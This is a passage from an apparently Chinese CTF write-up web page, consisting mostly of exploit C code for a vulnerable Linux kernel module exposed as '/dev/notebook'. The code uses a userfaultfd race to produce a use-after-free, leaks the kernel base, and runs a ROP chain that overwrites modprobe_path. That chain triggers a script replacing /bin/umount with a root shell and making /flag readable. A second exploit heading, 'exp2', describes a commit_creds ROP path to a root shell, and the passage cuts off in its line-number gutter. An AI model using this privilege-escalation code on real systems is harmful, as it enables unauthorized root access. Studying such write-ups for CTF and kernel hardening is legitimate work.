class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> g_fd = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span>* addr;</span><br><span class="line"><span class="keyword">uint64_t</span> temp_buf[<span class="number">0x20</span>];</span><br><span class="line"><span class="keyword">int</span> temp_fd;</span><br><span class="line"><span class="keyword">uint64_t</span> heap_addr;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE sysconf(_SC_PAGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> single_start_func = <span class="number">0xFFFFFFFF8128C230</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> bzImage_base = <span class="number">0xFFFFFFFF81000000</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> kernel_base;</span><br><span class="line"><span class="keyword">uint64_t</span> ret_188 = <span class="number">0xffffffff811a71c6</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rax_ret = <span class="number">0xffffffff81540d04</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rdi_ret = <span class="number">0xffffffff81007115</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> mov_ptr_rdi_rax = <span class="number">0xffffffff814157e9</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> modprobe_path_addr = <span class="number">0xFFFFFFFF8225D2E1</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> add_rsp_1a8 = <span class="number">0xffffffff816473a4</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> do_task_dead_func = <span class="number">0xFFFFFFFF810B3FA0</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rsp_ret = <span class="number">0xffffffff810bc110</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span>&#123;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> note;</span><br><span class="line">	<span class="keyword">uint64_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">userarg</span>&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> idx;</span><br><span class="line">    <span class="keyword">uint64_t</span> size;</span><br><span class="line">    <span class="keyword">char</span>* buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ErrExit</span><span class="params">(<span class="keyword">char</span>* err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">userfaultfd_leak_handler</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) arg;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    sleep(<span class="number">30</span>);</span><br><span class="line">    <span class="comment">// pause();</span></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* page = (<span class="keyword">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED) ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page,<span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;     <span class="comment">//我们要监视的区域</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)    <span class="comment">//注册缺页错误处理</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  cmd</span></span><br><span class="line"><span class="comment">    0x100 - noteadd : 为notebook[idx]-&gt;note申请一篇size大小的空间</span></span><br><span class="line"><span class="comment">    0x64 - notegift : 将notebook处的256个字节全部拷贝给用户态（信息泄露） - 泄露堆地址</span></span><br><span class="line"><span class="comment">    0x200 - notedel : free掉notebook[idx]-&gt;note对应的空间，在size不为0的情况下，清空bss段上的内容</span></span><br><span class="line"><span class="comment">    0x300 - noteedit : 修改notebook[idx]的大小，note和size，逻辑有问题导致size变任意大小</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">noteadd</span><span class="params">(<span class="keyword">uint64_t</span> idx, <span class="keyword">uint64_t</span> size, <span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x100</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">notedel</span><span class="params">(<span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = <span class="number">0</span>,</span><br><span class="line">        .buf = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    ioctl(g_fd, <span class="number">0x200</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">noteedit</span><span class="params">(<span class="keyword">uint64_t</span> idx, <span class="keyword">uint64_t</span> size, <span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x300</span>, &amp;arg);    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">notegift</span><span class="params">(<span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = <span class="number">0</span>,</span><br><span class="line">        .size = <span class="number">0</span>,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;   </span><br><span class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x64</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_note</span><span class="params">(<span class="keyword">char</span>* con_buf, <span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    write(g_fd,con_buf,idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_note</span><span class="params">(<span class="keyword">char</span>* con_buf, <span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    read(g_fd,con_buf,idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">edit_thread</span><span class="params">()</span></span>&#123;</span><br><span class="line">    noteedit(<span class="number">0</span>, <span class="number">0x100</span>, addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">add_thread</span><span class="params">()</span></span>&#123;</span><br><span class="line">    noteadd(<span class="number">0</span>,<span class="number">0x20</span>,addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare</span><span class="params">()</span></span>&#123; </span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh\nrm /bin/umount\necho -e \&quot;#!/bin/sh\\nexec 0&lt;/dev/console\\nexec 1&gt;/dev/console\\nexec 2&gt;/dev/console\\n/bin/sh\\n\&quot; &gt; /bin/umount\nchmod 777 /bin/umount&#x27; &gt; /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;chmod 777 /flag&#x27; &gt;&gt; /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(fork()) &#123;</span><br><span class="line">        sleep(<span class="number">20</span>);                          </span><br><span class="line">        system(<span class="string">&quot;/tmp/dummy 2&gt;/dev/null&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;ls -l /flag&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    prepare();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *ret_buf = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> fd[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">uint64_t</span> leak_addr;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    g_fd = open(<span class="string">&quot;/dev/notebook&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. notebook[0].note = heap1 / notebook[0].size = 0x20</span></span><br><span class="line">    <span class="keyword">char</span>* name = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(name, <span class="string">&#x27;a&#x27;</span>, <span class="number">18</span>);</span><br><span class="line">    noteadd(<span class="number">0</span>,<span class="number">0x20</span>,name);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. using userfaultfd to produce UAF: notebook[0].note = heap1 / notebook[0].size = 0x100</span></span><br><span class="line">    addr = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(addr, userfaultfd_leak_handler);</span><br><span class="line">    <span class="keyword">pthread_t</span> thr_edit,thr_add;</span><br><span class="line">    pthread_create(&amp;thr_edit, <span class="literal">NULL</span>, edit_thread, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. set notebook size to enable read/write : notebook[0].note = heap1 / notebook[0].size = 0x20</span></span><br><span class="line">    pthread_create(&amp;thr_add, <span class="literal">NULL</span>, add_thread, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// sleep(1);   //给1s缓冲时间，让size值写上</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 4. get heap1 back, then we can use the UAF</span></span><br><span class="line">    <span class="keyword">for</span>(i =<span class="number">0</span> ;i&lt;<span class="number">100</span>; i++)&#123;</span><br><span class="line">        fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>,<span class="number">0</span>);              <span class="comment">// in kernel it will kmalloc(0x20)</span></span><br><span class="line">        read_note(ret_buf, <span class="number">0</span>);                          <span class="comment">// check whether we hit heap1 or not</span></span><br><span class="line">        leak_addr = *(<span class="keyword">int64_t</span> *)ret_buf;</span><br><span class="line">        <span class="keyword">if</span>(((leak_addr&amp;<span class="number">0xffffffff00000000</span>) &gt;&gt; <span class="number">32</span>) == <span class="number">0xFFFFFFFF</span>)&#123;</span><br><span class="line">            index = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;found it! the index is %d\n&quot;</span>,index);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">100</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed to get heap1 back, let&#x27;s try again!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. leak kernel base: read heap1</span></span><br><span class="line">    kernel_base = leak_addr - (single_start_func - bzImage_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_base : 0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. hijack control flow: write heap1, then trigger &#x27;seq_operations-&gt;start&#x27;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> control_rip = add_rsp_1a8 - bzImage_base + kernel_base;</span><br><span class="line">    write_note((<span class="keyword">char</span>*)&amp;control_rip,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 7. stack pivoting: use the gift func ^_^</span></span><br><span class="line">    noteadd(<span class="number">1</span>,<span class="number">0x60</span>,name);</span><br><span class="line">    notegift(ret_buf);</span><br><span class="line">    heap_addr = *(<span class="keyword">int64_t</span> *)(ret_buf+<span class="number">0x10</span>);                 <span class="comment">// heap addr</span></span><br><span class="line">    <span class="keyword">uint64_t</span> gadget_buf[<span class="number">0x60</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gadget_buf[<span class="number">0</span>] = pop_rax_ret - bzImage_base + kernel_base;</span><br><span class="line">    gadget_buf[<span class="number">1</span>] = <span class="number">0x782f706d742f</span>;                                     <span class="comment">// /tmp/x</span></span><br><span class="line">    gadget_buf[<span class="number">2</span>] = pop_rdi_ret - bzImage_base + kernel_base;</span><br><span class="line">    gadget_buf[<span class="number">3</span>] = modprobe_path_addr - bzImage_base + kernel_base;</span><br><span class="line">    gadget_buf[<span class="number">4</span>] = mov_ptr_rdi_rax - bzImage_base + kernel_base;           <span class="comment">// write modprobe_path</span></span><br><span class="line">    gadget_buf[<span class="number">5</span>] = do_task_dead_func - bzImage_base + kernel_base;</span><br><span class="line">    write_note(gadget_buf,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    pop_rsp_ret = pop_rsp_ret - bzImage_base + kernel_base;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 8. trigger</span></span><br><span class="line">    temp_fd = fd[index];</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0x15151515;&quot;</span>     <span class="comment">// r15</span></span><br><span class="line">        <span class="string">&quot;mov r14, 0x14141414;&quot;</span>      <span class="comment">// r14 /tmp/x</span></span><br><span class="line">        <span class="string">&quot;mov r13, 0x13131313;&quot;</span>      <span class="comment">// r13</span></span><br><span class="line">        <span class="string">&quot;mov r12, 0x12121212;&quot;</span>      <span class="comment">// r12</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x11111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, 0x10101010;&quot;</span>      <span class="comment">// r10</span></span><br><span class="line">        <span class="string">&quot;mov rbp, pop_rsp_ret;&quot;</span>      <span class="comment">// bbbbbbbb</span></span><br><span class="line">        <span class="string">&quot;mov rbx, heap_addr;&quot;</span>      <span class="comment">// aaaaaaaa</span></span><br><span class="line">        <span class="string">&quot;mov r9, 0x99999999;&quot;</span>       <span class="comment">// r9</span></span><br><span class="line">        <span class="string">&quot;mov r8, 0x88888888;&quot;</span>       <span class="comment">//r8</span></span><br><span class="line">        <span class="string">&quot;mov rcx, 0xcccccccc;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 0x22222222;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, 0x33333333;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, temp_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



        <h3 id="exp2"   >
          <a href="#exp2" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3>
      <blockquote>
<p>commit_creds(prepare_cred(0))执行完成后，ROP链执行swapgs_restore_regs_and_return_to_usermode(), 提前设置好返回用户态的rip，获得root shell</p>
</blockquote>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span 